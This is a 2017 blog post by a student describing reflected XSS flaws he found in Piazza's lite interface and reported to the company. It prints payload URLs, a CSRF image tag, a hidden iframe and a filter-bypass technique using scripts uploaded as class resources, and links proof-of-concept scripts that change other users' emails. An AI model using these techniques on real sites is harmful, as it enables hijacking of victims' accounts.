---
title: Hacking Piazza with Cross-Site Scripting
author: Ryan Young
type: post
date: 2017-03-21T01:56:35+00:00
permalink: /2017/03/hacking-piazza-with-cross-site-scripting/
ampforwp-amp-on-off:
  - default
categories:
  - tech
tags:
  - security
  - utexas

---
[Piazza](https://piazza.com/) is a free classroom discussion service marketed for science and mathematics classes. It is best described as a hybrid wiki and forum; students can post questions, and other students can collaborate on answers. Like WordPress, content can be formatted with a rich-text editor or with plain HTML with a restricted set of features. Piazza’s distinguishing feature is the ability to post anonymously, which it [claims](https://piazza.com/about/story) makes underrepresented groups in the sciences more comfortable with interacting with the class. At UT, the computer science department makes extensive use of Piazza for most of its classes.

Piazza is primarily accessed through the web interface on [piazza.com](https://piazza.com). Of great interest, there is also a “lite” web interface designed for mobile devices and accessible browsers at [piazza.com/lite](https://piazza.com/lite). I will demonstrate that Piazza is susceptible to common client-side web attacks, such as cross-site scripting, as a result of its reliance on web apps. (There are also native [iOS](https://itunes.apple.com/us/app/piazza/id453142230) and [Android](https://play.google.com/store/apps/details?id=com.piazza.android) apps, but they are awful, and nobody uses them.)<!--more-->

### The setup

After a lecture in my network security class on [cross-site request forgery](https://en.wikipedia.org/wiki/Cross-site_request_forgery), my teacher hinted to me that there was a way to embed other webpages in a Piazza post. At first, I considered the most obvious strategy: external images. But images are uninteresting because they can only be (ab)used to send GET requests to fixed URLs.

<pre>&lt;img src="https://utdirect.utexas.edu/security-443/logoff.cgi" alt=""&gt;</pre>

After poking around the formatting controls, I discovered that Piazza allows users to embed inline frames in posts for the purpose of embedding videos. This makes sense, since most video sites (such as YouTube) use `iframes` in the HTML embedding code they generate for their users. But `iframe` is a dangerous element because it grants the ability to embed any arbitrary webpage. Therefore, Piazza takes some steps to inhibit the abuse of `iframes` in posts, such as whitelisting the `src`, `width`, `height`, and `frameborder` attributes and requiring HTTP or HTTPS URLs. But it does not enforce any kind of domain whitelisting or filtering, so we’re free to embed any URL of our choosing as long as it is served over HTTP or HTTPS.

<pre>&lt;iframe src="https://utexas.edu" width="500" height="500" frameborder="0"&gt;&lt;/iframe&gt;</pre>

I shared this finding with my teacher. Naturally, his immediate reaction was to share a private post with me that included a hidden frame embedding [superlogout.com](http://www.superlogout.com)…

<pre>&lt;iframe src="http://www.superlogout.com" width="0" height="0" frameborder="0"&gt;&lt;/iframe&gt;</pre>

### XSS&#8217;d

Another interesting feature of Piazza is that its web interfaces have a number of markup injection and [cross-site scripting](https://en.wikipedia.org/wiki/Cross-site_scripting) (XSS) vulnerabilities.

[One](https://www.openbugbounty.org/incidents/112873) has already been publicly disclosed on [openbugbounty.org](https://www.openbugbounty.org). It’s [within](https://piazza.com/signup/signup-done/activate?email=%22%3E%3Csvg/onload=prompt%28/XSSPOSED/%29%3E) the last webpage in the Piazza registration process, which is always accessible to a client, even if he or she did not initiate a registration or is already signed into a Piazza account.

Some MIT students [performed](https://web.archive.org/web/20170228232558/https://courses.csail.mit.edu/6.857/2016/files/22.pdf) a security audit of Piazza&#8217;s interface for their network security class. (Curiously, the paper has since been taken down.) They found one XSS attack in the Piazza Careers interface, which is of limited use because it can&#8217;t be used to attack other users. They found no vulnerabilities in Piazza&#8217;s main web interface.

I have discovered two new XSS attacks myself, both within Piazza’s lite interface. The first is within the search function. If a query returns no results, it’s reflected back to the client as HTML markup without escaping or filtering.

Requesting the URL

<pre>https://piazza.com/lite/feed?query=<span><strong>&lt;script&gt;console.log("hello")&lt;/script&gt;</strong></span></pre>

returns the markup

<pre id="line1">&lt;/<span class="end-tag">form</span>&gt;


<span id="line56"></span>&lt;<span class="start-tag">strong</span>&gt;No results for <span><strong>&lt;<span class="start-tag">script</span>&gt;console.log("hello")&lt;/<span class="end-tag">script</span>&gt;</strong></span>&lt;/<span class="end-tag">strong</span>&gt;


&lt;p&gt;</pre>

and the browser executes the JavaScript code.



![](/assets/posts/wp-uploads/2017/03/Piazza-XSS_lite_search.png)

The second is within the post creation function. A Piazza post can be of “type” `question` or `note`. The interface forces the selection of one or the other, but in fact it is possible to fill in any value within the query string, and it will also be reflected as markup.

Requesting the URL

<pre>https://piazza.com/lite/posts/new?type=<span><strong>xx&lt;script&gt;console.log("Hello World!")&lt;/script&gt;</strong></span></pre>

returns the markup (note capitalization transformations)

<pre id="line1">&lt;/ul&gt;



&lt;a id="main"&gt;&lt;/a&gt;
<span id="line44"></span>&lt;<span class="start-tag">h1</span>&gt;New <strong><span>Xx&lt;<span class="start-tag">script</span>&gt;console.log("hello world!")&lt;/<span class="end-tag">script</span>&gt;</span></strong>&lt;/<span class="end-tag">h1&gt;





</span>&lt;<span class="start-tag">form</span> <span class="attribute-name">action</span>=/lite/posts <span class="attribute-name">method</span>="POST" <span class="attribute-name">class</span>="form-horizontal"&gt;</pre>

<pre>&lt;<span class="start-tag">input</span> <span class="attribute-name">type</span>="checkbox" <span class="attribute-name">name</span>="make_private" <span class="attribute-name">id</span>="make_private" <span class="attribute-name">aria-labelledby</span>="make_private_label visible_class_instructors"&gt;
<span id="line105"></span>      &lt;<span class="start-tag">label</span> <span class="attribute-name">for</span>="make_private" <span class="attribute-name">id</span>="make_private_label"&gt;Make this a private <span><strong>xx&lt;<span class="start-tag">script</span>&gt;console.log("Hello World!")&lt;/<span class="end-tag">script</span>&gt;</strong></span>&lt;/<span class="end-tag">label</span>&gt;
<span id="line106"></span>      &lt;<span class="start-tag">br</span> /&gt;</pre>

and the browser again executes the JavaScript code.



![](/assets/posts/wp-uploads/2017/03/Piazza-XSS_lite_post.png)

The second attack is more reliable because it always works; the first requires a search query that is guaranteed to return no results in any of the victim’s classes. The second attack does inject the markup twice, but this is easily accounted for with a JavaScript imitation of C-style include guards.

<pre class="western">if (!beEvil) { beEvil=true;
...
}</pre>

### Fun with JavaScript

Active content that we can inject using these XSS attacks _is run within the context of the piazza.com domain_ because that’s where it appears to have been served from. Combined with the ability to embed an `iframe` to any webpage, we can now embed _arbitrary JavaScript_ in a Piazza post that _runs within the same origin_, thus bypassing the [same-origin policy](https://en.wikipedia.org/wiki/Same-origin_policy).

Once we have the ability to execute our “trusted” JavaScript, we can do some truly frightening things to other Piazza users. In principle, anything they can do within their browsers, we can also do with our script code. For example, we can change profile pictures – [this](/assets/posts/wp-uploads/2017/03/Piazza-XSS_change-pic.js.txt) proof of concept changes one’s profile picture to a picture of [Mr. Anderson](http://powerlisting.wikia.com/wiki/File:Neo_The_One.jpg).

We can also manipulate the DOM, changing, forging, and hiding posts. Worse still, since Piazza does not require reauthentication to add new email addresses, _we can even [change](/assets/posts/wp-uploads/2017/03/Piazza-XSS_change-email.js.txt) the email address__es_ _associated with_ _other_ _account__s_.

All of this can occur silently, in the background, by the mere act of viewing a malicious post. The silver lining is that Piazza sets the HTTP-only flag on its cookies, so its session tokens can&#8217;t be read and stolen by JavaScript.

When I tested the XSS attacks, they worked perfectly in Firefox. But my injected JavaScript code refused to run in other browsers. A glance at the developer console revealed why.



![](/assets/posts/wp-uploads/2017/03/Piazza-XSS_antixss_console.png)

Most other browsers (Chrome/Chromium, Safari, Edge) feature “XSS filters” that reject any active content, like a section of JavaScript code, an `iframe` tag, a `base` tag, or an `object` tag, that is part of the URL. This is intended to be a last-resort defense against XSS attacks. In this case, it works. In Chromium, you can see the lexer flagging the JavaScript code we attempted to inject.



![](/assets/posts/wp-uploads/2017/03/Piazza-XSS_antixss_source.png)

How can we get around this? Well, in web development, the browser makers always make backwards compatibility concessions to please that [one](https://bugzilla.mozilla.org/show_bug.cgi?id=765645) webmaster who would file a bug report for the broken behavior of his shoddily written site.

In the case of XSS filters, that concession is that the filters overlook injected content that _comes from the first-party domain_. That means we&#8217;re allowed to insert any script that is hosted on piazza.com.

<pre class="western">query=&lt;script src="<strong>https://piazza.com</strong>/.../path/to/something.js"&gt;&lt;/script&gt;</pre>

At first, this doesn’t seem terribly useful. We aren’t Piazza, and we don’t control any files on their servers. Right?

### Being resourceful

Instructors on Piazza can upload “resources” for their classes, files that can be accessed and downloaded by students. Resources are hosted on the Cloudfront content distribution network, but critically, Piazza also generates permalinks on the piazza.com domain.

<pre>https://piazza.com/class_profile/get_resource/&lt;UID of class&gt;/&lt;UID of resource&gt;</pre>

Furthermore, resources are accessible to anyone, as a Google search [reveals](https://www.google.com/search?q=site:piazza.com/class_profile/get_resource). Thus, to get a malicious script hosted on the piazza.com domain, all we have to do is create a class to gain access to the resource upload function and upload the script.

And there we have it – embedded JavaScript in a Piazza post that defeats the same-origin policy as well as browser-side XSS filters!



![](/assets/posts/wp-uploads/2017/03/Piazza-XSS_poc.png)

I reported these vulnerabilities to Piazza’s support team on February 9. They acknowledged them and will be rolling out fixes over the “next several weeks.”

While the main Piazza web interface appears reasonably secure against XSS attacks, it seems lesser used components, such as the lite interface and the email registration process, did not receive the same amount of developer scrutiny.

The lesson here is to be security conscious about every part of your application. Anything can become a markup injection vector.